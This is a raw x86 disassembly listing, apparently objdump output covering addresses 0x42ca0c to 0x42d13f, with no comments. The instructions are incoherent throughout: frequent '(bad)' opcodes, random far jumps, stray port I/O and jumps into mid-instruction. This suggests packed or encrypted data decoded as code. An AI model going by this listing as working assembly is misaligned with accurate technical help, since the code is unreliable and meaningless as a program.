  42ca0c:	retf   
  42ca0d:	and    dh,ch
  42ca0f:	scas   al,BYTE PTR es:[edi]
  42ca10:	das    
  42ca11:	aam    0xcd
  42ca13:	jl     0x42ca10
  42ca15:	adc    al,0xcf
  42ca17:	scas   al,BYTE PTR es:[edi]
  42ca18:	je     0x42ca2f
  42ca1a:	cmp    DWORD PTR [esi+edi*4],0x680aa220
  42ca21:	jno    0x42c9d7
  42ca23:	test   BYTE PTR [esi-0x41],bl
  42ca26:	mov    esi,DWORD PTR [eax+0x14ae6542]
  42ca2c:	push   ebp
  42ca2d:	mov    ebp,0x52d4a1a1
  42ca32:	adc    esi,DWORD PTR [ebp-0x5b327156]
  42ca38:	push   edx
  42ca39:	cmp    ebx,DWORD PTR [edi]
  42ca3b:	cmp    bl,dh
  42ca3d:	push   ss
  42ca3e:	xchg   edi,eax
  42ca3f:	(bad)  
  42ca40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ca41:	(bad)  
  42ca42:	stc    
  42ca43:	xchg   esi,eax
  42ca44:	mov    esp,0xe9a0b5aa
  42ca49:	sbb    eax,0xe35050a1
  42ca4e:	in     eax,dx
  42ca4f:	inc    esp
  42ca50:	jae    0x42cacf
  42ca52:	jmp    0x36ce37b3
  42ca57:	and    cl,bl
  42ca59:	test   al,0x82
  42ca5b:	(bad)  
  42ca5c:	push   0x14
  42ca5e:	pop    ebp
  42ca5f:	mov    al,ds:0xef8e2697
  42ca64:	dec    edx
  42ca65:	add    al,0xa9
  42ca67:	fstp   DWORD PTR [esi-0x71]
  42ca6a:	xchg   ecx,eax
  42ca6b:	xor    bh,al
  42ca6d:	inc    edx
  42ca6e:	inc    edi
  42ca6f:	shl    DWORD PTR [edx+0x60],0x9
  42ca73:	push   edx
  42ca74:	fdivr  st,st(0)
  42ca76:	mov    dh,0xf3
  42ca78:	mov    bl,BYTE PTR [edi-0x12]
  42ca7b:	add    esp,ecx
  42ca7d:	iretw  
  42ca7f:	cmp    BYTE PTR [ebp-0x2],0x64
  42ca83:	jae    0x42ca2f
  42ca85:	pusha  
  42ca86:	dec    edx
  42ca87:	pop    edx
  42ca88:	mov    ch,0xe2
  42ca8a:	stos   BYTE PTR es:[edi],al
  42ca8b:	dec    eax
  42ca8c:	sub    ah,ah
  42ca8e:	fs push esp
  42ca90:	mov    bl,bl
  42ca92:	lock jl 0x42cab4
  42ca95:	add    edi,ecx
  42ca97:	into   
  42ca98:	mov    WORD PTR [ebx+ebp*8+0x3e],ss
  42ca9c:	pushf  
  42ca9d:	or     DWORD PTR [esi],0x5a
  42caa0:	shl    dh,1
  42caa2:	push   esi
  42caa3:	jle    0x42ca43
  42caa5:	pusha  
  42caa6:	inc    eax
  42caa7:	or     DWORD PTR [edi-0x5f3bb279],edi
  42caad:	(bad)  
  42caae:	out    dx,eax
  42caaf:	and    eax,0xe6815952
  42cab4:	adc    al,0x25
  42cab6:	out    dx,al
  42cab7:	inc    ecx
  42cab8:	pop    es
  42cab9:	xor    DWORD PTR [eax+0x41],0xffffffdc
  42cabd:	pusha  
  42cabe:	pop    edi
  42cabf:	inc    edx
  42cac0:	sti    
  42cac1:	jmp    0x4bf8fa63
  42cac6:	jmp    0x42cb12
  42cac8:	ror    DWORD PTR [edi+0x6ba40c],0xf2
  42cacf:	into   
  42cad0:	add    BYTE PTR [ecx+0x23],ah
  42cad3:	xchg   ebx,eax
  42cad4:	pop    ebp
  42cad5:	pop    ecx
  42cad6:	jg     0x42cac5
  42cad8:	cdq    
  42cad9:	retf   0xdb02
  42cadc:	daa    
  42cadd:	or     esi,ebp
  42cadf:	xlat   BYTE PTR ds:[ebx]
  42cae0:	xchg   BYTE PTR [esi+0x7bbce1bd],bh
  42cae6:	xchg   esi,eax
  42cae7:	mov    al,0x7e
  42cae9:	js     0x42cb1d
  42caeb:	adc    BYTE PTR [esi-0x40],bl
  42caee:	movlps QWORD PTR [edx+ecx*1-0x52],xmm0
  42caf3:	or     eax,0x2c62612b
  42caf8:	sub    BYTE PTR [eax-0x64de6193],ch
  42cafe:	jmp    0x42cb4f
  42cb00:	std    
  42cb01:	dec    ecx
  42cb02:	jmp    0x42cb50
  42cb04:	loop   0x42cadf
  42cb06:	pop    ds
  42cb07:	popa   
  42cb08:	sbb    ecx,edi
  42cb0a:	out    0x40,al
  42cb0c:	cwde   
  42cb0d:	pusha  
  42cb0e:	call   0xb85:0xe8a26c6a
  42cb15:	mov    ebp,0x210a5dee
  42cb1a:	adc    al,0x5f
  42cb1c:	addr16 nop
  42cb1e:	outs   dx,BYTE PTR ds:[esi]
  42cb1f:	lahf   
  42cb20:	xlat   BYTE PTR ds:[ebx]
  42cb21:	jmp    0x66fc:0x1e13beaf
  42cb28:	repnz dec ebx
  42cb2a:	pop    esi
  42cb2b:	xor    dh,dl
  42cb2d:	outs   dx,BYTE PTR ds:[esi]
  42cb2e:	out    dx,al
  42cb2f:	add    bh,BYTE PTR [eax+0x27381401]
  42cb35:	pop    eax
  42cb36:	mov    eax,ds:0xc46574a1
  42cb3b:	call   0x69488909
  42cb40:	repz ret 0x70ee
  42cb44:	fisttp DWORD PTR [esi]
  42cb46:	and    DWORD PTR [edx+0x2b],0xffffff8c
  42cb4a:	inc    ebx
  42cb4b:	adc    DWORD PTR [eax+ebp*4+0x6133f2a4],ebp
  42cb52:	jno    0x42cb33
  42cb54:	enter  0x6375,0x93
  42cb58:	(bad)  
  42cb59:	push   ecx
  42cb5a:	out    dx,al
  42cb5b:	in     eax,dx
  42cb5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cb5d:	adc    al,0xda
  42cb5f:	xchg   esi,eax
  42cb60:	lods   eax,DWORD PTR ds:[esi]
  42cb61:	loope  0x42cb25
  42cb63:	mov    BYTE PTR [ecx-0x41],bh
  42cb66:	mov    al,0x2e
  42cb68:	mov    ch,0x86
  42cb6a:	out    dx,al
  42cb6b:	sbb    ebx,ebx
  42cb6d:	jp     0x42cb02
  42cb6f:	mov    bh,BYTE PTR [edx]
  42cb71:	xlat   BYTE PTR ds:[ebx]
  42cb72:	(bad)  
  42cb73:	mov    al,ds:0x70669382
  42cb78:	push   esi
  42cb79:	call   0x15e3:0xa8632280
  42cb80:	add    ecx,eax
  42cb82:	cwde   
  42cb83:	xor    al,0x2b
  42cb85:	jne    0x42cbca
  42cb87:	nop
  42cb88:	pop    esp
  42cb89:	scas   eax,DWORD PTR es:[edi]
  42cb8a:	mov    WORD PTR [eax],gs
  42cb8c:	test   al,0x82
  42cb8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cb8f:	in     al,0x69
  42cb91:	xchg   edi,eax
  42cb92:	xchg   esi,eax
  42cb93:	mov    ?,WORD PTR [ecx-0xb9511d0]
  42cb99:	test   DWORD PTR [esi-0x1bfa1498],0xb89cca0
  42cba3:	xor    DWORD PTR [ecx+0x523499da],esp
  42cba9:	scas   al,BYTE PTR es:[edi]
  42cbaa:	aam    0x9f
  42cbac:	adc    ebx,eax
  42cbae:	xchg   DWORD PTR cs:[edi],eax
  42cbb1:	shr    BYTE PTR [ebp-0x5d],1
  42cbb4:	retf   
  42cbb5:	sbb    BYTE PTR [edx],bl
  42cbb7:	jmp    0xa934:0xd0e5c45e
  42cbbe:	in     eax,dx
  42cbbf:	sbb    BYTE PTR [esi+0x8],0xa6
  42cbc3:	or     ah,ch
  42cbc5:	stos   DWORD PTR es:[edi],eax
  42cbc6:	rol    BYTE PTR [ecx+0x67],cl
  42cbc9:	popa   
  42cbca:	fadd   QWORD PTR [esi]
  42cbcc:	stc    
  42cbcd:	rcr    BYTE PTR [esi-0x11f0a95c],cl
  42cbd3:	dec    esp
  42cbd4:	pop    esp
  42cbd5:	lahf   
  42cbd6:	xor    al,0x1b
  42cbd8:	shl    BYTE PTR [ecx+0x1ff0a152],0x6a
  42cbdf:	and    al,0xc8
  42cbe1:	inc    esp
  42cbe2:	add    BYTE PTR [ecx+0x17635e5e],dl
  42cbe8:	lds    ebp,FWORD PTR [eax+0x607fd01c]
  42cbee:	sbb    DWORD PTR [ecx],esp
  42cbf0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cbf1:	and    al,0x3b
  42cbf3:	clc    
  42cbf4:	les    ebx,FWORD PTR [ebp-0x5751a12]
  42cbfa:	in     eax,dx
  42cbfb:	add    DWORD PTR [ecx],0x1ef16827
  42cc01:	pop    esi
  42cc02:	test   al,0x9c
  42cc04:	sahf   
  42cc05:	retf   
  42cc06:	adc    BYTE PTR [edi+0x76],0xb4
  42cc0a:	sub    BYTE PTR ds:0xbfe7ed5e,dl
  42cc10:	in     al,dx
  42cc11:	mov    eax,0x5e066498
  42cc16:	xor    BYTE PTR [ecx+esi*8-0x217ed2e1],al
  42cc1d:	add    eax,0x1d5d1186
  42cc22:	aas    
  42cc23:	jg     0x42cbdf
  42cc25:	jle    0x42cc51
  42cc27:	stos   BYTE PTR es:[edi],al
  42cc28:	jbe    0x42cc1c
  42cc2a:	in     eax,0xa3
  42cc2c:	ficomp DWORD PTR [esi]
  42cc2e:	add    eax,0x4ed33ab8
  42cc33:	sbb    bh,dh
  42cc35:	dec    ecx
  42cc36:	out    dx,al
  42cc37:	pop    edx
  42cc38:	inc    esi
  42cc39:	mov    BYTE PTR [eax-0x50e65623],bh
  42cc3f:	lock addr16 push edi
  42cc42:	stos   BYTE PTR es:[edi],al
  42cc43:	test   eax,0xa18cdfdf
  42cc48:	jns    0x42cc2a
  42cc4a:	add    al,bl
  42cc4c:	dec    esi
  42cc4d:	stc    
  42cc4e:	out    dx,al
  42cc4f:	loope  0x42cc52
  42cc51:	in     eax,dx
  42cc52:	mov    edi,edx
  42cc54:	ss cld 
  42cc56:	adc    esp,DWORD PTR [ecx+0x23bccf18]
  42cc5c:	xchg   esi,eax
  42cc5d:	mov    cl,0xfe
  42cc5f:	jmp    0x42ccc5
  42cc61:	out    0x2a,al
  42cc63:	jmp    0x42cc6d
  42cc65:	jp     0x42cc64
  42cc67:	mov    ds:0xf4ca47e,al
  42cc6c:	(bad)  
  42cc6d:	pusha  
  42cc6e:	mov    ecx,0xb3c9c6c7
  42cc73:	xor    eax,0x8dee9ff4
  42cc78:	sbb    dh,BYTE PTR [esi+0x53]
  42cc7b:	stos   BYTE PTR es:[edi],al
  42cc7c:	and    edx,edx
  42cc7e:	push   esi
  42cc7f:	mov    ds:0xf3ddfe4,al
  42cc84:	mov    eax,ds:0xcd7db027
  42cc89:	test   ah,bl
  42cc8b:	add    DWORD PTR [esi+0x2],ebx
  42cc8e:	(bad)  
  42cc8f:	xchg   edx,eax
  42cc90:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  42cc92:	dec    eax
  42cc93:	cmp    BYTE PTR [edi+0x61],dl
  42cc96:	int3   
  42cc97:	enter  0x9fc3,0x25
  42cc9b:	loopne 0x42ccdb
  42cc9d:	push   edx
  42cc9e:	out    dx,al
  42cc9f:	loope  0x42cc68
  42cca1:	inc    esi
  42cca2:	cmp    ch,cl
  42cca4:	and    DWORD PTR [ebx-0x78],eax
  42cca7:	mov    eax,ds:0xbbfad293
  42ccac:	sbb    DWORD PTR [eax-0x5ba1bc88],edi
  42ccb2:	imul   esp,DWORD PTR [eax+0x7b673fb7],0xa0d8f09f
  42ccbc:	push   es
  42ccbd:	mov    esi,0xc751a2f9
  42ccc2:	popa   
  42ccc3:	mov    ebx,0x88ee25d6
  42ccc8:	std    
  42ccc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ccca:	shl    DWORD PTR [esi-0x70886c12],1
  42ccd0:	add    BYTE PTR [edx-0x71999f97],dh
  42ccd6:	into   
  42ccd7:	fnstcw WORD PTR [edi]
  42ccd9:	mov    bh,0xf2
  42ccdb:	rcr    BYTE PTR [esi-0x4],cl
  42ccde:	fistp  DWORD PTR [edx+0x7b]
  42cce1:	push   ebp
  42cce2:	lods   al,BYTE PTR ds:[esi]
  42cce3:	mov    dh,BYTE PTR [esi-0x486439d7]
  42cce9:	outs   dx,BYTE PTR ds:[esi]
  42ccea:	imul   edx,DWORD PTR [esi-0x4fc2c3c2],0xbbdb2281
  42ccf4:	pop    esi
  42ccf5:	jo     0x42cc92
  42ccf7:	daa    
  42ccf8:	das    
  42ccf9:	xchg   esp,eax
  42ccfa:	and    al,0x5f
  42ccfc:	mov    ds:0xc1eff65f,eax
  42cd01:	jl     0x42cccf
  42cd03:	lahf   
  42cd04:	jecxz  0x42cca6
  42cd06:	push   esp
  42cd07:	mov    cl,0x52
  42cd09:	pop    esi
  42cd0a:	mov    esi,0x287a9d7e
  42cd0f:	dec    esp
  42cd10:	inc    eax
  42cd11:	icebp  
  42cd12:	out    0x7e,al
  42cd14:	pop    esi
  42cd15:	and    ebx,DWORD PTR [edx+0x3c]
  42cd18:	test   eax,0x5ef46026
  42cd1d:	popf   
  42cd1e:	retf   
  42cd1f:	popf   
  42cd20:	dec    ebp
  42cd21:	in     eax,0x3b
  42cd23:	mov    cl,0x8a
  42cd25:	sbb    BYTE PTR [eax],dl
  42cd27:	call   FWORD PTR [esi+0x7a]
  42cd2a:	xchg   bx,ax
  42cd2c:	pop    ebx
  42cd2d:	sub    ch,ah
  42cd2f:	jge    0x42cd8e
  42cd31:	sbb    eax,DWORD PTR [eax-0x5625a3eb]
  42cd37:	test   BYTE PTR [esi+0x55a0d204],al
  42cd3d:	shl    dl,0xe3
  42cd40:	cwde   
  42cd41:	shl    DWORD PTR [edi-0x5bdda15e],0xd1
  42cd48:	cmp    dh,BYTE PTR [esi-0x2f]
  42cd4b:	call   0xc8cd:0xf64c6104
  42cd52:	retf   
  42cd53:	mov    edi,0xf9ee464f
  42cd58:	jb     0x42cd03
  42cd5a:	ficomp WORD PTR [edi]
  42cd5c:	into   
  42cd5d:	fcomp  QWORD PTR ds:0xb10197a4
  42cd63:	xor    al,0x37
  42cd65:	jns    0x42cdbd
  42cd67:	xchg   edx,eax
  42cd68:	mov    eax,ds:0xbda3ee2c
  42cd6d:	ret    0xd42
  42cd70:	sub    esi,DWORD PTR [ecx]
  42cd72:	jns    0x42cd15
  42cd74:	cmp    cl,BYTE PTR [ebp-0x5f882940]
  42cd7a:	mov    bh,0xb6
  42cd7c:	pop    esi
  42cd7d:	jne    0x42cda3
  42cd7f:	jae    0x42cdbe
  42cd81:	inc    edi
  42cd82:	add    BYTE PTR [eax],dl
  42cd84:	ss popa 
  42cd86:	in     eax,0xdb
  42cd88:	xor    eax,0xf317e97c
  42cd8d:	(bad)  
  42cd8e:	out    dx,al
  42cd8f:	pop    ebp
  42cd90:	inc    edx
  42cd91:	lock mov cl,0x98
  42cd94:	xchg   edi,eax
  42cd95:	(bad)  
  42cd96:	std    
  42cd97:	mov    eax,ds:0x854e98f5
  42cd9c:	sti    
  42cd9d:	int3   
  42cd9e:	arpl   WORD PTR [ebp-0x1a],sp
  42cda1:	inc    edi
  42cda2:	out    dx,al
  42cda3:	out    dx,eax
  42cda4:	mov    ebx,0x6ca8d6ca
  42cda9:	mov    ah,0x45
  42cdab:	mov    eax,ds:0x134b14b2
  42cdb0:	shl    DWORD PTR [ebp-0x3fa48422],0x94
  42cdb7:	rcl    DWORD PTR [eax],1
  42cdb9:	retf   0xb77d
  42cdbc:	dec    eax
  42cdbd:	(bad)  
  42cdbe:	pop    esi
  42cdbf:	scas   eax,DWORD PTR es:[edi]
  42cdc0:	push   0x60
  42cdc2:	sar    ah,1
  42cdc4:	popa   
  42cdc5:	dec    edx
  42cdc6:	fist   DWORD PTR [edx-0x4b11f3c7]
  42cdcc:	and    dh,BYTE PTR [ecx-0x1a]
  42cdcf:	mov    bl,0xa0
  42cdd1:	jne    0x42cdc7
  42cdd3:	mov    al,ds:0x50565e8d
  42cdd8:	xchg   DWORD PTR [eax+0x70],edi
  42cddb:	ds pop esi
  42cddd:	test   eax,0x8a5d01ae
  42cde2:	mov    edx,0x5c61248d
  42cde7:	fwait
  42cde8:	cmp    BYTE PTR [ebx+0x58],bl
  42cdeb:	mov    esp,0xa810f535
  42cdf0:	jmp    0x7aa9:0x1dceeefb
  42cdf7:	dec    edx
  42cdf8:	shl    DWORD PTR [eax-0x80],cl
  42cdfb:	pop    esp
  42cdfc:	xor    dl,bl
  42cdfe:	push   ds
  42cdff:	cmp    DWORD PTR [eax+0x46],ebp
  42ce02:	out    dx,al
  42ce03:	je     0x42ce49
  42ce05:	inc    ecx
  42ce06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ce07:	cmp    al,0x9a
  42ce09:	sahf   
  42ce0a:	jmp    0xeedb0db8
  42ce0f:	xchg   BYTE PTR [ecx-0x6153731a],cl
  42ce15:	xchg   ebx,eax
  42ce16:	out    dx,al
  42ce17:	and    DWORD PTR [ebx-0x68],edi
  42ce1a:	or     al,0x54
  42ce1c:	sbb    BYTE PTR [edi-0x2907387a],bl
  42ce22:	lds    ebx,FWORD PTR [edi+0x106efe31]
  42ce28:	test   eax,0xeb5b154c
  42ce2d:	mov    al,ds:0x22ea32ee
  42ce32:	push   cs
  42ce33:	pop    edx
  42ce34:	dec    ebx
  42ce35:	mov    eax,0x7d8a0e6
  42ce3a:	lods   eax,DWORD PTR ds:[esi]
  42ce3b:	bound  ebx,QWORD PTR [ebx-0x76f9102]
  42ce41:	or     esi,ebp
  42ce43:	cmc    
  42ce44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ce45:	test   al,0xb9
  42ce47:	mov    eax,ds:0xa80d971c
  42ce4c:	adc    al,0xfc
  42ce4e:	gs scas al,BYTE PTR es:[edi]
  42ce50:	repz ror BYTE PTR [eax-0x15],0x17
  42ce55:	sahf   
  42ce56:	out    dx,al
  42ce57:	sbb    DWORD PTR [edx],esi
  42ce59:	xchg   ecx,eax
  42ce5a:	sahf   
  42ce5b:	inc    ebx
  42ce5c:	data16 jae 0x42ce40
  42ce5f:	mov    al,ds:0x1177543f
  42ce64:	sub    eax,0x33d986db
  42ce69:	int    0x97
  42ce6b:	and    DWORD PTR [esi+0x427db98e],edx
  42ce71:	dec    esp
  42ce72:	sbb    ah,BYTE PTR [ecx+0x6afff84b]
  42ce78:	xchg   ecx,eax
  42ce79:	aam    0xf8
  42ce7b:	adc    edx,DWORD PTR [ebx+0x78]
  42ce7e:	repnz (bad) 
  42ce80:	cdq    
  42ce81:	adc    BYTE PTR [edx-0x5843a54f],ah
  42ce87:	(bad)  [esi-0x6a5ebbb8]
  42ce8d:	add    eax,esp
  42ce8f:	aad    0x1
  42ce91:	and    ebp,DWORD PTR [ebx-0x11608566]
  42ce97:	test   eax,ebp
  42ce99:	jge    0x42cec9
  42ce9b:	mov    bl,0x81
  42ce9d:	dec    esp
  42ce9e:	ja     0x42ce41
  42cea0:	icebp  
  42cea1:	int3   
  42cea2:	add    ebx,DWORD PTR [esi]
  42cea4:	ja     0x42cf12
  42cea6:	xchg   ecx,eax
  42cea7:	lods   eax,DWORD PTR ds:[esi]
  42cea8:	fs jp  0x42ce88
  42ceab:	mov    ds:0x615d7268,eax
  42ceb0:	add    BYTE PTR [esi+ebp*4-0x2b9f3633],dh
  42ceb7:	ins    DWORD PTR es:[edi],dx
  42ceb8:	js     0x42ce8e
  42ceba:	dec    ax
  42cebc:	push   edi
  42cebd:	and    ch,dh
  42cebf:	inc    ebx
  42cec0:	push   es
  42cec1:	data16 jae 0x42cf0f
  42cec4:	mov    ebp,0x6ca0e263
  42cec9:	mov    ch,0x45
  42cecb:	mov    ch,0x29
  42cecd:	test   DWORD PTR [esi],0xc14631fd
  42ced3:	stos   DWORD PTR es:[edi],eax
  42ced4:	outs   dx,DWORD PTR ds:[esi]
  42ced5:	loopne 0x42cebc
  42ced7:	mov    dl,0xd3
  42ced9:	pop    ebx
  42ceda:	aaa    
  42cedb:	push   cs
  42cedc:	addr16 pop edx
  42cede:	repnz ror ebx,cl
  42cee1:	fldenv [ecx+eiz*8-0x22db7a27]
  42cee8:	push   ecx
  42cee9:	fistp  DWORD PTR [ebp+0x1d]
  42ceec:	sbb    eax,0xe4a45648
  42cef1:	mov    bl,0x36
  42cef3:	sbb    al,BYTE PTR [edx+ebx*2-0x5a]
  42cef7:	repz cwde 
  42cef9:	lods   al,BYTE PTR ds:[esi]
  42cefa:	push   ebx
  42cefb:	or     DWORD PTR [edx+0x4fee5267],0x5ed876fa
  42cf05:	test   eax,0x131759d1
  42cf0a:	adc    BYTE PTR [ecx-0x5c699bdf],ah
  42cf10:	cmp    esi,DWORD PTR [edi]
  42cf12:	cwde   
  42cf13:	stos   BYTE PTR es:[edi],al
  42cf14:	pop    esi
  42cf15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cf16:	jge    0x42ce9a
  42cf18:	push   ds
  42cf19:	add    eax,0x611156db
  42cf1e:	add    al,0x66
  42cf20:	dec    eax
  42cf21:	je     0x42cf69
  42cf23:	jae    0x42cea5
  42cf25:	mov    esp,0x955ee47e
  42cf2a:	inc    ecx
  42cf2b:	js     0x42cf0f
  42cf2d:	sub    edi,DWORD PTR [edx-0x39bb769f]
  42cf33:	fs push edi
  42cf35:	popa   
  42cf36:	sbb    al,0xe8
  42cf38:	into   
  42cf39:	xchg   ecx,eax
  42cf3a:	ds xor al,0x5e
  42cf3d:	imul   eax,DWORD PTR [ecx+0x72974f5a],0x79
  42cf44:	push   es
  42cf45:	pop    edx
  42cf46:	pop    edx
  42cf47:	inc    edi
  42cf48:	int3   
  42cf49:	aad    0x55
  42cf4b:	or     DWORD PTR [ebx+0x5bb22aef],0x5f830860
  42cf55:	xlat   BYTE PTR ds:[ebx]
  42cf56:	(bad)  
  42cf57:	sub    BYTE PTR [ebx+0xa8f9fb3],ah
  42cf5d:	mov    eax,0xbe00210f
  42cf62:	dec    esi
  42cf63:	mov    esi,0x5cee58d6
  42cf68:	pop    edx
  42cf69:	(bad)  
  42cf6a:	xrelease mov DWORD PTR [edx+0x7a],ebp
  42cf6e:	int    0x9f
  42cf70:	(bad)  
  42cf71:	adc    dl,BYTE PTR [ebp+esi*8+0x1e]
  42cf75:	icebp  
  42cf76:	jge    0x42cf5f
  42cf78:	add    ch,ah
  42cf7a:	dec    edx
  42cf7b:	outs   dx,BYTE PTR ds:[esi]
  42cf7c:	ss xchg edx,eax
  42cf7e:	xchg   ebp,eax
  42cf7f:	mov    ds:0xd74c9b40,al
  42cf84:	dec    eax
  42cf85:	xor    cl,BYTE PTR [esi-0x2e]
  42cf88:	pop    edx
  42cf89:	popa   
  42cf8a:	sub    eax,0x7849e468
  42cf8f:	pop    ebx
  42cf90:	(bad)  
  42cf91:	mov    esp,0x300e23ee
  42cf96:	jno    0x42cf3e
  42cf98:	sbb    ecx,ebp
  42cf9a:	and    BYTE PTR [edx+0x5453e3cd],ah
  42cfa0:	shr    ecx,0xbb
  42cfa3:	ins    BYTE PTR es:[edi],dx
  42cfa4:	pop    edx
  42cfa5:	pop    edx
  42cfa6:	out    dx,al
  42cfa7:	adc    ebp,esp
  42cfa9:	stos   BYTE PTR es:[edi],al
  42cfaa:	xor    eax,0xd04bf0f1
  42cfaf:	mov    ah,dh
  42cfb1:	pop    esi
  42cfb2:	push   eax
  42cfb3:	xchg   edi,eax
  42cfb4:	retf   0xee04
  42cfb7:	jmp    0x79093af6
  42cfbc:	and    BYTE PTR [esp+edx*2+0x556719a1],0x7c
  42cfc4:	ret    
  42cfc5:	scas   al,BYTE PTR es:[edi]
  42cfc6:	sar    BYTE PTR [esi],cl
  42cfc8:	pop    esi
  42cfc9:	retf   0xbdae
  42cfcc:	int3   
  42cfcd:	cmp    ebp,esp
  42cfcf:	ret    
  42cfd0:	mov    ch,0x60
  42cfd2:	push   eax
  42cfd3:	dec    edx
  42cfd4:	loopne 0x42cf7d
  42cfd6:	rcl    DWORD PTR [edx+0x56],0x87
  42cfda:	fcom   st(3)
  42cfdc:	adc    ah,ah
  42cfde:	and    al,0xa2
  42cfe0:	mov    edi,0x22fe77ed
  42cfe5:	pop    esp
  42cfe6:	push   ds
  42cfe7:	inc    edx
  42cfe8:	dec    ebp
  42cfe9:	popa   
  42cfea:	jle    0x42cfbb
  42cfec:	push   cs
  42cfed:	inc    edi
  42cfee:	sub    al,dl
  42cff0:	xchg   ecx,eax
  42cff1:	mov    cl,0xef
  42cff3:	push   edx
  42cff4:	jo     0x42cfd2
  42cff6:	inc    esp
  42cff7:	sar    DWORD PTR [eax+0x26],0x77
  42cffb:	cmp    al,bh
  42cffd:	inc    esp
  42cffe:	es mov esp,0x9160e161
  42d004:	jmp    FWORD PTR [ecx+0x75e8768]
  42d00a:	(bad)  
  42d00b:	mov    ds:0xb0558b6f,al
  42d010:	in     eax,0x60
  42d012:	jp     0x42d00c
  42d014:	mov    ch,0xfc
  42d016:	icebp  
  42d017:	clc    
  42d018:	sub    ah,BYTE PTR [esi+ebp*8-0x24]
  42d01c:	clc    
  42d01d:	lds    esp,FWORD PTR [esi+esi*8-0x5f40bd05]
  42d024:	ret    
  42d025:	lods   eax,DWORD PTR ds:[esi]
  42d026:	and    al,0x19
  42d028:	jle    0x42cff7
  42d02a:	jno    0x42d07d
  42d02c:	pop    esi
  42d02d:	or     ebx,DWORD PTR [edi+0x16]
  42d030:	xor    al,0xde
  42d032:	jo     0x42d038
  42d034:	jmp    0x6e7b:0x905f5855
  42d03b:	ins    BYTE PTR es:[edi],dx
  42d03c:	cmc    
  42d03d:	stos   DWORD PTR es:[edi],eax
  42d03e:	or     BYTE PTR [ebp+0x5592095e],dl
  42d044:	add    eax,DWORD PTR [edi-0x514bf5e7]
  42d04a:	mul    BYTE PTR [eax+0x39fd0430]
  42d050:	arpl   WORD PTR [edi],sp
  42d052:	or     eax,0x90a65d7b
  42d057:	fdivr  st(1),st
  42d059:	int    0xbb
  42d05b:	dec    esp
  42d05c:	or     BYTE PTR [edx+0x4d],0xa1
  42d060:	retf   0x243
  42d063:	icebp  
  42d064:	cdq    
  42d065:	pop    esi
  42d066:	(bad)  
  42d067:	rcr    BYTE PTR [esi-0x7a],1
  42d06a:	outs   dx,DWORD PTR ds:[esi]
  42d06b:	repz sub al,0x6d
  42d06e:	xor    DWORD PTR [eax],ebp
  42d070:	loope  0x42d0b6
  42d072:	and    ecx,DWORD PTR [esi]
  42d074:	jmp    DWORD PTR [eax+0x4ab4c9d5]
  42d07a:	push   esi
  42d07b:	add    ebx,DWORD PTR [esi-0x62]
  42d07e:	xchg   ebp,eax
  42d07f:	push   edx
  42d080:	das    
  42d081:	arpl   dx,ax
  42d083:	xor    BYTE PTR [ecx],ah
  42d085:	popa   
  42d086:	inc    ecx
  42d087:	inc    edi
  42d088:	and    BYTE PTR [ecx-0x7b75bcf6],bl
  42d08e:	out    dx,al
  42d08f:	xchg   edi,eax
  42d090:	fwait
  42d091:	ss mov bl,0xf2
  42d094:	push   0x65
  42d096:	retf   
  42d097:	mov    al,ds:0xe6dff38c
  42d09c:	xchg   esi,eax
  42d09d:	push   es
  42d09e:	or     eax,DWORD PTR ds:0xeaebe270
  42d0a4:	push   es
  42d0a5:	or     eax,0xf87a54b5
  42d0aa:	scas   al,BYTE PTR es:[edi]
  42d0ab:	stc    
  42d0ac:	mov    esp,DWORD PTR [eax-0x50]
  42d0af:	sti    
  42d0b0:	ja     0x42d11c
  42d0b2:	sub    al,0x54
  42d0b4:	jnp    0x42d060
  42d0b6:	out    dx,al
  42d0b7:	cli    
  42d0b8:	mov    ebp,0x67ff924d
  42d0bd:	adc    eax,0xcea8a15d
  42d0c2:	retf   
  42d0c3:	mov    cl,0x56
  42d0c5:	fs icebp 
  42d0c7:	test   DWORD PTR [esi+0x43],ebx
  42d0ca:	ret    
  42d0cb:	nop
  42d0cc:	in     eax,0x9b
  42d0ce:	dec    edx
  42d0cf:	mov    cl,0x74
  42d0d1:	pusha  
  42d0d2:	das    
  42d0d3:	sub    al,0xfc
  42d0d5:	shr    ch,1
  42d0d7:	pop    eax
  42d0d8:	icebp  
  42d0d9:	(bad)  
  42d0da:	out    dx,al
  42d0db:	xor    BYTE PTR [edi+edi*1],bl
  42d0de:	cli    
  42d0df:	xchg   ebp,eax
  42d0e0:	mov    dl,0xc
  42d0e2:	ins    BYTE PTR es:[edi],dx
  42d0e3:	lods   al,BYTE PTR ds:[esi]
  42d0e4:	xchg   ebp,eax
  42d0e5:	pop    es
  42d0e6:	mov    ax,ds:0x81f2afbe
  42d0ec:	in     al,0xeb
  42d0ee:	xchg   esi,eax
  42d0ef:	xchg   ecx,eax
  42d0f0:	pop    esi
  42d0f1:	jb     0x42d083
  42d0f3:	shl    DWORD PTR [ebp*4+0x67095b25],0x23
  42d0fb:	rcl    DWORD PTR [ecx+edx*8+0x51],cl
  42d0ff:	loop   0x42d12f
  42d101:	mov    ch,0xf
  42d103:	sbb    DWORD PTR [edi-0xbde5a91],edi
  42d109:	shr    BYTE PTR [eax],cl
  42d10b:	arpl   WORD PTR [ecx],cx
  42d10d:	icebp  
  42d10e:	lahf   
  42d10f:	mov    eax,ds:0xea75ee84
  42d114:	mov    esi,0x5e9e0f7d
  42d119:	sub    ebp,ebp
  42d11b:	push   ss
  42d11c:	enter  0x355,0xed
  42d120:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d121:	sub    al,0xbd
  42d123:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d124:	sar    DWORD PTR [eax+ecx*8+0x1e],cl
  42d128:	das    
  42d129:	jno    0x42d17e
  42d12b:	gs mov bh,0x39
  42d12e:	lea    edx,[eax-0x76]
  42d131:	sbb    BYTE PTR [esp+edx*2+0x1320e454],0x9e
  42d139:	inc    esp
  42d13a:	sub    eax,0xc9b7bbd4
  42d13f:	mov    al,ds:0xa5dc2179
